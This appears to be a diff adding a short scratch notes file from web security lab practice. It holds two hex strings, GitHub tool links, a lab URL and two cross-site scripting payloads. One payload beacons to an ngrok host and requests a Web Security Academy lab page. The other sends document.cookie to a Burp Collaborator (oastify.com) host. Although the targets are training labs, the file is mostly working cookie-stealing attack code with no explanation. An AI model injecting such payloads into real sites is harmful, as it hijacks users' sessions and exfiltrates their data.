@@ -1,0 +1,24 @@
+1afedc472d0fdfe07cd075d36804efd0
+
+
+
+f220d3988deb3f516c73f40ee16c431d
+
+   <script>
+		  new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?test=zz";
+		  var url = "https://0a47005303bf35d88153f20800b200de.web-security-academy.net/post?postId=5";
+		  var loadProfile = new XMLHttpRequest();
+		  loadProfile.open("GET", url, false);
+		  loadProfile.send();
+    </script>
+	
+	
+	   	<script>
+    new Image().src = "http://95cc1ya0onngt0he3gubwaa0drji78vx.oastify.com/log?test=" + document.cookie;
+</script>
+
+https://github.com/Zeecka/AperiSolve
+https://github.com/0x4m4/hexstrike-ai
+
+
+http://cdcomeg23g7mi8v4k6dv9do4t4zlgwl3241jnfeve-web.cybertalentslabs.com/
